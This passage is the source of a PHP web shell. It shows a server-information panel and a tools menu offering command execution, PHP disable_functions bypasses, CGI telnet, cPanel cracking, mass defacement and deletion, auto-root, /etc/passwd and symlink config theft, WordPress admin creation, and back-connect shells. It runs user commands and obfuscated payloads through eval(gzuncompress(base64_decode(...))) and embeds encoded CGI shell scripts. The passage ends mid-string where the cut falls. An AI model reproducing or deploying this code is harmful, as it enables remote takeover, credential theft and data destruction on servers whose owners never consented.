                                PHP version: <gr><?= $phpver; ?></gr> | PHP os: <gr><?= $phpos; ?></gr><br>
                                Domains: <gr><?= $dom; ?></gr><br>
                                Server Ip: <gr><?= $ip; ?></gr><br>
                                Your Ip: <gr><?= $uip; ?></gr><br>
                                User: <gr><?= $downer; ?></gr> | Group: <gr><?= $dgrp; ?></gr><br>
                                Safe Mode: <?= $sm; ?><br>
                                MYSQL: <?= $sql; ?> | PERL: <?= $pl; ?> | PYTHON: <?= $py; ?> | WGET: <?= $wget; ?> | CURL: <?= $curl; ?> | GCC: <?= $gcc; ?> | PKEXEC: <?= $pkexec; ?><br>
                                Disable Function:<br><pre><?= $disfc; ?></pre>
                            </div>
                        </div>
                    <!-- configuration fiture -->
                    <div class="kanan py-3" id="tools">
                    <button class="btn btn-outline-light" data-bs-toggle="collapse" data-bs-target="#collapsetools" aria-expanded="false" aria-controls="collapsetools"><i class="fa fa-info-circle"></i> Tools <i class="fa fa-chevron-down"></i></button>
                    <div class="collapse text-light mb-3" id="collapsetools">
                        <center>
                            <hr width='20%'>
                        </center>
                        <div class="d-flex justify-content-center flex-wrap my-3">
                            <a href="<?= $_SERVER['PHP_SELF']; ?>" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-home"></i> Home</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=upload" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-upload"></i> Upload</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=command" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> Command</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=commandtujuh" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> Command Bypass 7.0-7.3</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=commanddelapan" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> Command Bypass 7.3-8.1</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=cgi-telnet" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> CGI Telnet</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=cpanelcrack" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> CPanel Crack</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=jumping" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> Jumping</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=massdeface" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-layer-group"></i> Mass Deface</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=massdelete" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-eraser"></i> Mass Delete</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=massht" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-eraser"></i> Mass .htaccess</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=autoroot" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-hashtag"></i> Auto Root</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=bypassglob" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-network-wired"></i> Bypass Glob</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=addnewadmin" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-lock"></i> Add New Admin WP</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=scansuid" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-user"></i> Scan Suid</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=passwbypass" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> Bypass Etc/Passwd</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=autoeditconfig" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-user"></i> Auto Edit User Config</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=symlink" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-terminal"></i> Symlink</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=config" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-network-wired"></i> Config</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=lock" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-lock"></i> Lock Shell</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=lockfiles" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-lock"></i> Lock File</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=backconnect" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-network-wired"></i> Back Connect</a>
                <a href="?logout" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-network-wired"></i> Logout</a>
                        </div>
                        </div>
                        </div>
                        <center>
                            <hr width='20%'>
                        </center>

                        <div class="container" id="tools">
                            <!-- endif -->
                            <?php if (isset($_GET['action']) && $_GET['action'] != 'download') : $action = $_GET['action'] ?>
                            <?php endif; ?>
                            <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>

                                <div class="col-md-12">
                                    <div class="row justify-content-center">
                                        <?php if ($action == 'rename' && isset($_GET['item'])) : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label for="name" class="form-label">New Name</label>
                                                        <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
                                                    </div>
                                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                                    <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                                        <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
                                                    </div>
                                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                                    <button type="button" class="btn btn-outline-light" onclick="jscopy()">Copy</button>
                                                    <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                                        <input type="number" class="form-control" name="newPerm" value="<?= substr(sprintf('%o', fileperms($_GET['item'])), -4); ?>">
                                                    </div>
                                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                                    <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'upload') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post" enctype="multipart/form-data">
                                                    <div class="mb-3">
                                                        <label class="form-label">File Uploader</label>
                                                        <div class="input-group">
                                                            <input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload" multiple>
                                                            <button class="btn btn-outline-light" type="submit" id="inputGroupFileAddon04">Upload</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                            
                                            <?php elseif ($action == 'massht') : ?>
                                                <center>
                                                <form method="POST">
                                                    <input type="hidden" name="go" id="go" value="massht">
                                                    <table class="tables">
                                                        <tr>
                                                            <th style="width:15%;">Mass htcs</th>
                                                            <th>Path</th>
                                                        </tr>
                                                        <tr>
                                                            <td>Prefix</td>
                                                            <td>
                                                                <input type="text" name="d_dir" style="width:268px;" value="<?php echo getcwd(); ?>"> (Path to folder you wanna Mass htcs)
                                                            </td>
                                                        </tr>
                                                        <tr>
                                                            <td>isi htcs</td>
                                                            <td><textarea style="width: 582px; height: 171px;" name="script"></textarea></td>
                                                        </tr>
                                                        <tr>
                                                            <td>Action</td>
                                                            <td><input class="btn btn-outline-light" type="submit" name="start" style="width:80px;" value="Mass!"></td>
                                                        </tr>
                                                    </table>
                                                </form>
                                            </center>

                                                <?php 
                                                if (isset($_POST["start"])) {
                                                    kkk();
                                                }
                                                ?>
                                            
                                            <?php elseif ($action == 'command') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post" onsubmit="document.getElementById('ucmd').value = btoa(document.getElementById('ucmd').value)">
                                                    <div class="mb-3">
                                                        <label class="form-label">Command</label>
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" id="ucmd" name="ucmd" placeholder="whoami">
                                                            <button class="btn btn-outline-light" type="submit">Submit</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>

                                             <?php elseif ($action == 'commandtujuh') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label class="form-label">Command Bypass 7.0-7.3</label>
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" name="cmd7" placeholder="whoami">
                                                            <button class="btn btn-outline-light" type="submit">Submit</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>

                                       <?php elseif ($action == 'commanddelapan') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label class="form-label">Command Bypass 7.3-8.1</label>
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" name="cmd8" placeholder="whoami">
                                                            <button class="btn btn-outline-light" type="submit">Submit</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>

                                        <?php elseif ($action == 'cgi-telnet') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <select class="form-control" name="option">
                                                        <option value="cgipy">CGI Python</option>
                                                        <option value="cgi">CGI V1</option>
                                                    </select>
                                                        <input class="btn btn-success" type="submit" name="summon" value="Summon">
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'massdeface') : ?>
                                            <?php massdeface($path); ?>

                                        <?php elseif ($action == 'massdelete') : ?>
                                            <?php massdelete($path); ?>

                                        <?php elseif ($action == 'autoroot') : ?>
                                            <?php autoroot(); ?>

                                        <?php elseif ($action == 'scansuid') : ?>
                                            <?php scansuid(); ?>

                                        <?php elseif ($action == 'bypassglob') : ?>
                                            <?php bypassglob(); ?>

                                        <?php elseif ($action == 'addnewadmin') : ?>
                                            <?php addnewadmin(); ?>
                                        
                                        <?php elseif ($action == 'jumping') : ?>
                                            <?php aksiJump($dir, $file, $ip); ?>

                                        <?php elseif ($action == 'config') : ?>
                                            <?php aksiConfig($dir, $file); ?>
                                        
                                        <?php elseif ($action == 'passwbypass') : ?>
                                            <?php aksiBypasswd($dir, $file); ?>
                    
                                        <?php elseif ($action == 'symlink') : ?>
                                            <?php aksiSym($dir, $file); ?>

                                        <?php elseif ($action == 'symread') : ?>
                                            <?php aksiSymread($dir, $file); ?>

                                        <?php elseif ($action == 'sym_404') : ?>
                                            <?php sym404($dir, $file); ?>

                                        <?php elseif ($action == 'sym_bypas') : ?>
                                            <?php symBypass($dir, $file); ?>

                                        <?php elseif ($action == 'autoeditconfig') : ?>
                                            <?php autoeditconfig(); ?>

                                        <?php elseif ($action == 'cpanelcrack') : ?>
                                            <?php cpanelcrack(); ?>

                                        <?php elseif ($action == 'lock') : ?>
                                            <div class="p-2">
                                                <div class="row justify-content-center">
                                                    <div class="card col-md-7 mb-3">
                                                    <?php lockshell(); ?>
                                                    <?php echo '<span class="text-success">Shell Locked Success</span>';  ?>
                                                    </div>
                                                </div>
                                            </div>
                                        <?php elseif ($action == 'lockfiles') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label class="form-label">Lock File</label>
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" name="lockfile" placeholder="whoami">
                                                            <button class="btn btn-outline-light" type="submit">Submit</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'backconnect') : ?>

                                            <div class="col-md-5">
                                                <!-- end php -->
                                                <?php bctool(); ?>

                                            </div>
                                        <!-- endif -->
                                        <?php endif; ?>

                                    </div>
                                </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <!-- command -->
                            <?php if (isset($_POST['ucmd'])) : ?>
                                <div class="p-2">
                                    <div class="row justify-content-center">
                                        <div class="card text-dark col-md-7 mb-3">
                                            <?php
                                            // Dekode nilai command dari base64 sebelum menjalankannya
                                            $decoded_command = base64_decode($_POST['ucmd']);
                                            ?>
                                            <pre><?php echo $nm."@".$serv.":&nbsp;~$&nbsp;"; echo $decoded_command . "<br>"; ?><br><br><code><?php echo LewsEx($decoded_command, false); ?></code></pre>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <!-- command bypass 7.0-7.3 -->

                            <?php if (isset($_POST['cmd7'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card text-dark col-md-7 mb-3">
                                        <pre><?php echo $nm."@".$serv.":&nbsp;~$&nbsp;"; echo $x = $_POST['cmd7']; $x."<br>"; ?><br><br><?php 
$reqex = "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";
eval("?>".gzuncompress(base64_decode($reqex)));?></pre>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <!-- command bypass 7.3-8.1 -->
                            <?php if (isset($_POST['cmd8'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card text-dark col-md-7 mb-3">
                                        <pre><?php echo $nm."@".$serv.":&nbsp;~$&nbsp;"; echo $x = $_POST['cmd8']; $x."<br>"; ?><br><br><?php 
$reqex = "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";
eval("?>".gzuncompress(base64_decode($reqex)));?></pre>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <?php if (isset($_POST['summon'])) : ?>
                                <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card col-md-7 mb-3">
                            <?php
$submit = $_POST['summon'];
$cgipy = "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";
$cgipl = "eJztfXtf27gS6P98CtVkSbKEPKB0t4SkyyPQtBRoEqAPuj1O7CReHDtrOzz6OJ/9zowkW3YcCF3o2Xt/l91CYkuj0WhmNBqNRotPShPfK3UtpzQ2PZutNOm77fZ0u9TVHWNkOQsT32Rvmm8aGxvbum8+e1pdyJyanm+5To1pO/vNlY5pO2bAxENWKa5pUKZhWMGxKKdt9l0nYH5wY5u1bGBeByv+UDfcqw1WHl/Tv2fwzxt0c6vr6wVWhv/zhfDduni3Vi7P8a7Keq7tehuLffqpMmx75cq0BsNgo+vaRjVbbw+tLxO3srb2G4MebJawSB2wXsgc675/5XoGg84dmFd+YHpY7I+MVmXyZ5HtDHVnYLJgaPlF9t6dsCvLtpljmgYLXGY6UIte4jfbHVhOccGfdFnT/3xmObn81wUEk3F9aGUp8KxRLtM4PP2qtRut00brc/tor3O21Wpo3/NVKmn1c1T4v2xUuoLBsgQE/PHMYOIB1XnJ7/TbtH1zqkRZlvi+kAEsDjvYuMQo6hzvIPZJdqcnO2uyS92emMzth52rAG4L7I6fRXbjTrKeybyJ41jOgNf2e541DhhwjM4AB+AGnx125gA20ntDyzGLrNlPArYI3oljXRfw1RzAerrDbFO/VPun+wgIhhb44bCzMzLa5hj5YUmrTgPoYF+ARJ7ew1GHLyAwRDffBKHSA5OtAkeORiBO/hwIWUgPUZ7Z0E/sUUQfxAn7F2FVTWL1k3BCLBCbHf68Y41MdxLsTgA8qoEaq5ThpyowgrcIxjd7LrTJ9D4iJlHg4tM12QX8NY05MNp1nSwoFFA7khN1dml6N8zWvYEYxyKngzVPD4E+/YkNqkJBKhjqATDbDUP+Z65HD+aAFegXpkDGRWYHhXBt9iaBWQDawSutD6PJSlpxDliiB9ghywCq2zeS9NB5DxoB/dMM5uujNXBcz0QowEesLarDCLaH7tXujaOPrN7RJBhPAhw8Vd01hcDD/5UCCorDDD3Q8bsPyg67CA/nQKHrARfDwIOE+S5KvpA05lK7BeYCHO/K8ucBxmt2J/2+id1C3gRsDHaF+KE0i5GcRwu4o7FtBqYf8kwqR+DwzQFtDKqoAB3kHAR6iLSMb3Idw7vKuz5PL6GLJuq2gemQ6BowZCAAR4fZDtt5uXW432Bbh+87L5uH+2y7cXB0xuBzmx00Dxvs5PCg0W6z90cn7PUhvDl7udXBb9lWAyBgjSdPUISlMsmJmeEFixTfBlMUDkxIWPr4yoiV1nqGBgW18ZWhYZFjPRgmIWrn51SmRCVapmF5Zi8A8sYKsdX6UoVV6kurVBg/VegZ1YKZ3QfeXIe5LIOsVGOrz6oLiysP+gPUbZk6KQDUWThYxOXdG3oS8jCw2lj3fFMteKl7lt61TRJLACQK7Dc6BXZ81O5QrdHEDix4E4Dd4Y1WSJSIVaSiRqabjG1XN3Dg+xbCW0BlYNIXkFSTZC8geQa1mrGcr9l+9juBR2xC8UwUgdr4Kvsd4R2hsEUoE5eCEtZ7PdNHNCY+Nk8VoVD2ewFFy0P